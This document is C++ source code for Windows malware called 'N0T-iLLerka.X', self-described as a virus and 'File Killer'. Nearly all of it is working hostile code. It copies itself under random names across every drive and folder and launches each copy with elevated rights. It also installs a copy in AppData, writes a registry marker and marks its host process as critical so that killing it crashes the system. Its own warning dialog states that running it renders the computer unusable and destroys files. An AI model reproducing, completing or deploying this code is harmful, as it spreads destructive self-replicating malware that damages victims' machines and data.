/*-------------------------------------------------------------------------------------------*\
 |  _______  _________________     __ ___     ___                 __               ____  ___ |
 |  \      \ \   _  \__   ___/    |__|   |   |   |    ___________|  | ______       \   \/  / |
 |  /   |   \/  /_\  \|   | ______|  |   |   |   |  _/ __ \_  __ \  |/ \__  \       \     /  |
 | /    |    \  \_/   \   |/_____/|  |   |___|   |__\  ___/|  | \/    < / __ \_     /     \  |
 | \____|__  /\_____  /___|       |__|______ \______ \___  >__|  |__|_ (____  / /\ /___/\  \ |
 |         \/       \/                      \/      \/   \/           \/    \/  \/       \_/ |
 +----------------------------------------------------------------+--------------------------/
 | N0T-iLLerka.X [your File Killer]      [Virus.Win32.C Type: .X] |
 | by Lima X [L4X] / [G-C-E-R] © 2k19            [dev-VER: 0.4.8] |
\*----------------------------------------------------------------*/

#include "../HeaderFiles/N0TiLLerka.h"

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
	int nArgs;
	LPWSTR* szArglist = CommandLineToArgvW(GetCommandLine(), &nArgs);

	// Check if ArgumentList was Created, if not: Exit Malware
	if (!szArglist) {
#ifdef DEBUG
		MessageBox(NULL, L"Couldn't parse Commandline", L"CommandLineToArgvW", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif
		if (szArglist) {
			LocalFree(szArglist);
		}
		ExitProcess(EXIT_FAILURE);
	}

	if (nArgs > 1) {
		if (!lstrcmp(szArglist[1], L"/exec")) {
			// ######## Start of /exec ######## Malware Payload execution #######################################################################################
#ifdef DEBUG
			MessageBox(NULL, L"Executing with Argument: /exec", L"N0T-iLLerka.X", MB_OK | MB_SYSTEMMODAL | MB_ICONINFORMATION);
#endif

			// Check if /host Mutex exist, if not: Exit Malware
			if (!CheckMutex(HOST_MUTEX)) {
				if (szArglist) {
					LocalFree(szArglist);
				}
				ExitProcess(EXIT_FAILURE);
			}

			wchar_t mfn[MAX_PATH];
			GetModuleFileName(NULL, mfn, MAX_PATH);
			wchar_t cd[MAX_PATH];
			GetCurrentDirectory(MAX_PATH, cd);

			std::vector<std::wstring> vwsDir, vwsFile;
			if (DirectoryIeterator(cd, L"*", vwsDir, vwsFile)) {
				std::wstring wsNf;
				for (std::wstring x : vwsDir) {
					wsNf = x + L"\\" + RandomStringGenerator(MIN_RSLEN + (RandomNumberGenerator() % ((MAX_RSLEN - MIN_RSLEN) + 1))) + L".exe";
					CopyFile(mfn, wsNf.c_str(), FALSE);
					ShellExecute(NULL, L"runas", wsNf.c_str(), L"/exec", x.c_str(), SW_SHOWDEFAULT);
				}
				for (std::wstring x : vwsFile) {

				}
			}

			if (szArglist) {
				LocalFree(szArglist);
			}
			ExitProcess(EXIT_SUCCESS);
			// ######## End of /exec ############################################################################################################################
		}
		else if (!lstrcmp(szArglist[1], L"/host")) {
			// ######## Start of /host ######## Malware Host with/without Malware initialization ################################################################
				// /init: Initialize the Malware Host
#ifdef DEBUG
				MessageBox(NULL, L"Executing with Argument: /host", L"N0T-iLLerka.X", MB_OK | MB_SYSTEMMODAL | MB_ICONINFORMATION);
#endif

			if (!IsUserAdmin()) {
#ifdef DEBUG
				MessageBox(NULL, L"Process isn't Administrator", L"N0T-iLLerka.X", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif
				if (szArglist) {
					LocalFree(szArglist);
				}
				ExitProcess(EXIT_FAILURE);
			}

			if (!SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS)) {
#ifdef DEBUG
				MessageBox(NULL, L"Couldn't set Malware Host to High Priority\nRunning with Normal Priority", L"SetPriorityClass", MB_OK | MB_SYSTEMMODAL | MB_ICONWARNING);
#endif
			}

			// Get ModuleFileName
			wchar_t mfn[MAX_PATH];
			GetModuleFileName(NULL, mfn, MAX_PATH);

			// Check if /host Mutex already exist, if exist: exit Malware, if not: { ... }
			if (!CheckMutex(HOST_MUTEX)) {
				// Create /host Mutex for /exec operation
				HANDLE hMutex = CreateMutex(NULL, TRUE, HOST_MUTEX);
				if (!hMutex) {
#ifdef DEBUG
					MessageBox(NULL, L"Couldn't create /host Mutex", L"N0T-iLLerka.X", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif
					if (szArglist) {
						LocalFree(szArglist);
					}
					ExitProcess(EXIT_FAILURE);
				}
			}
			else {
#ifdef DEBUG
				MessageBox(NULL, L"Malware Host is already running\n(Mutex already exist)", L"N0T-iLLerka.X", MB_OK | MB_SYSTEMMODAL | MB_ICONINFORMATION);
#endif
				if (szArglist) {
					LocalFree(szArglist);
				}
				ExitProcess(EXIT_FAILURE);
			}

			// Create /host Semaphore for /exec operation
			HANDLE hSemaphore = CreateSemaphore(NULL, MAX_SMPO, MAX_SMPO, HOST_SEMAPHORE);
			if (!hSemaphore) {
#ifdef DEBUG
				MessageBox(NULL, L"Couldn't create /host Semaphore", L"N0T-iLLerka.X", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif
				if (szArglist) {
					LocalFree(szArglist);
				}
				ExitProcess(EXIT_FAILURE);
			}

			if (nArgs > 2) {
				// Initialize the Malware
				if (!lstrcmp(szArglist[2], L"/init")) {
					// /init: Initialize the Malware with Host
#ifdef DEBUG
					MessageBox(NULL, L"Executing with Argument: /init", L"N0T-iLLerka.X", MB_OK | MB_SYSTEMMODAL | MB_ICONINFORMATION);
#endif					
					// Enumerate Drives
					std::vector<std::wstring> vwsDrives;

					if (DriveEnumerator(vwsDrives)) {
						// Copy & Execute Malware in all enumerated Drives
						for (std::wstring current_drive : vwsDrives) {
							std::wstring wsNmfn = current_drive + RandomStringGenerator(MIN_RSLEN + (RandomNumberGenerator() % ((MAX_RSLEN - MIN_RSLEN) + 1))) + L".exe";

							if (CopyFile(mfn, wsNmfn.c_str(), FALSE)) {
								ShellExecute(NULL, L"runas", wsNmfn.c_str(), L"/exec", current_drive.c_str(), SW_SHOWDEFAULT);
							}
							else {
#ifdef DEBUG
								MessageBox(NULL, L"Couldn't copy Binary to target Path", L"CopyFileW", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif
							}
						}
					} else {
						// If DriveEnumerator fails, try C:\ Directory
						std::wstring wsNmfn = L"C:\\" + RandomStringGenerator(MIN_RSLEN + (RandomNumberGenerator() % ((MAX_RSLEN - MIN_RSLEN) + 1))) + L".exe";

						if (CopyFile(mfn, wsNmfn.c_str(), FALSE)) {
							ShellExecute(NULL, L"runas", wsNmfn.c_str(), L"/exec", L"C:\\", SW_SHOWDEFAULT);
						}
						else {
#ifdef DEBUG
							MessageBox(NULL, L"Couldn't copy Binary to target Path", L"CopyFileW", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif
						}
					}

					// Create Registry Key
					if (!CreateRegistryKey(L"SOFTWARE\\N0T-iLLerka.X", L"N0TiLLerka", REG_DWORD, 0xBADC0DE)) {
						// TODO: add nothing at all because I don't know what I should do here.
						//		 If the functions fails well then it will fail.
						//		 This function is only included because it is used to prevent the Malware to install itself multiple times,
						//		 if the User manually executes the Malware after the initial Initialization
					}
				}
			}

			if (NTImportDLLFUNC()) {
				if (NTSetProcessIsCritical(TRUE)) {
#ifdef DEBUG
					MessageBox(NULL, L"HostProcess is now Critical", L"N0T-iLLerka.X", MB_OK | MB_SYSTEMMODAL | MB_ICONWARNING);
#endif
				}
			}


			if (szArglist) {
				LocalFree(szArglist);
			}
			for (;;) {
				Sleep(INFINITE);
			}
			// ######## End of /host ############################################################################################################################
		}
	}

	// If no Argument was passed ...

	// Get ModuleFileName
	wchar_t mfn[MAX_PATH];
	GetModuleFileName(NULL, mfn, MAX_PATH);
	
	// Create Random String to Copy host into AppData if necessary
	PWSTR pwShkfp;
	SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &pwShkfp);
	std::wstring wsAdpn = std::wstring(pwShkfp) + L"\\" + RandomStringGenerator(MIN_RSLEN + (RandomNumberGenerator() % ((MAX_RSLEN - MIN_RSLEN) + 1)));
	std::wstring wsAdfn = wsAdpn + L"\\" + RandomStringGenerator(16) + L".exe";
	CoTaskMemFree(pwShkfp);

	// Check Registry Key/Type/Value
	if (CheckRegistryKey(L"SOFTWARE\\N0T-iLLerka.X", L"N0TiLLerka", REG_DWORD, 0xBADC0DE)) {
		if (!IsUserAdmin()) {
			ShellExecute(NULL, L"runas", mfn, NULL, NULL, SW_SHOWDEFAULT);

			if (szArglist) {
				LocalFree(szArglist);
			}
			ExitProcess(EXIT_FAILURE);
		}

		if (!CheckMutex(HOST_MUTEX)) {
			if (CopyFileAppData(wsAdpn.c_str(), wsAdfn.c_str(), mfn)) {
				ShellExecute(NULL, L"runas", wsAdfn.c_str(), L"/host", NULL, SW_SHOWDEFAULT);
			} else {
				if (szArglist) {
					LocalFree(szArglist);
				}
				ExitProcess(EXIT_FAILURE);
			}
		}

		int iKillswitch = 0;
		while (!CheckMutex(HOST_MUTEX)) {
			if (iKillswitch == 50) {
#ifdef DEBUG
				MessageBox(NULL, L"Malware Host failed to launch", L"N0T-iLLerka.X", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif
				if (szArglist) {
					LocalFree(szArglist);
				}
				ExitProcess(EXIT_FAILURE);
			}
			
			iKillswitch++;
			Sleep(100);
		}

		ShellExecute(NULL, L"runas", mfn, L"/exec", NULL, SW_SHOWDEFAULT);
	} else {
#ifdef WARN
		// Warn User about the execution of the Malware
		if (MessageBox(NULL, L"The Software you're trying to execute is considered Malware !\n\n"
			L"Running this Malware will result in your Computer being unusable "
			L"and your Files being irreparably damaged/destroyed.\n\n"
			L"If you're seeing this Message without knowing what you just executed, simply press NO and nothing will happen.\n"
			L"If you know what you're doing press YES to continue.\n\n"
			L"DO YOU WANT TO EXECUTE THIS MALWARE ?", L"N0T-iLLerka.X", MB_YESNO | MB_SYSTEMMODAL | MB_ICONWARNING) == IDYES) {
#endif
			if (CopyFileAppData(wsAdpn.c_str(), wsAdfn.c_str(), mfn)) {
				ShellExecute(NULL, L"runas", wsAdfn.c_str(), L"/host /init", wsAdpn.c_str(), SW_SHOWDEFAULT);
			} else {
				if (szArglist) {
					LocalFree(szArglist);
				}
				ExitProcess(EXIT_FAILURE);
			}
#ifdef WARN
		}
#endif
	}

	if (szArglist) {
		LocalFree(szArglist);
	}
	return EXIT_SUCCESS;
}